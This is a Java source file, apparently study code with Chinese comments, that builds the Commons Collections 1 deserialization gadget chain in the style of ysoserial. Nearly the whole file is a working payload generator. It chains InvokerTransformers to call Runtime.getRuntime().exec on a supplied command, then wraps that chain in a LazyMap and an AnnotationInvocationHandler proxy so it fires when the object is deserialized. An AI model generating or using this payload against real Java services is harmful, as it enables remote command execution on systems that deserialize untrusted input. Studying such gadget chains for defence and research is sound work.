/*
 * 本类是根据CC1简化和详细分析的链
 * */

package com.hachp1.deser.ysoserial;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;


import java.util.HashMap;
import java.util.Map;

public class TestCC {
    /*
     * AnnotationInvocationHandler->readObject    (用Proxy代替的)
     * AnnotationInvocationHandler->invoke (Proxy触发handler的invoke)
     * LazyMap->get
     * xxx->transform

     * 使用transformer构造一个恶意payload Runtime.getRuntime().exec('');
     * */

    public static Object getObject(String cmd) throws Exception {

        // 因为InvokerTransformer的参数必须输入数组，所以这里强行构造一个数组
        String[] execArgs = new String[]{cmd};

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class), // 直接获取Runtime类
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, execArgs),
        };

        //先实例化一个空的transformer，防止在反序列化之前就执行命令
//        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        //AnnotationInvocationHandler类是非public类，只能通过反射得到，并且类型只能用Class<?>
        Class tmp_annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

        //获取AnnotationInvocationHandler的构造函数并设置为可见（取消protected）
        //此外，由于该类不是public的，所以这里不能直接用该类进行newInstance，而是需要获取其声明构造函数以得到对象
        Constructor constructor = tmp_annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        //LazyMap的构造函数是protected，不能直接调用，可以通过decorate间接调用：
        //public static Map decorate(Map map, Transformer factory) {
        //        return new LazyMap(map, factory);
        //    }

        Map testMap = new HashMap();//这里的decorate方法必须要随便一个Map对象，所以选择初始化一个HashMap
        Map lazyMap = LazyMap.decorate(testMap, chainedTransformer);

        //使用AnnotationInvocationHandler构造函数得到实例
        //第一个参数必须为Class<? extends Annotation>，所以这里选择Retention.class（其他满足条件的也可以
        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);

        //获取一个代理，用来代理Map类的对象，其第三个参数（handler）为AnnotationInvocationHandler对象，以触发其invoke方法
        //注意这里内部的transformer是空的，如果此时已包含恶意payload，则会触发，并且在反序列化时不会触发
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, annotationInvocationHandler);


        InvocationHandler res = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);

        //防止在反序列化之前就执行命令，在这里才通过反射对真正的恶意transformer链进行赋值
//        Class chainClass = chainedTransformer.getClass();
//        Field iTransformers = chainClass.getDeclaredField("iTransformers");
//        iTransformers.setAccessible(true);
//        iTransformers.set(chainedTransformer, transformers);

        return res;
    }
}
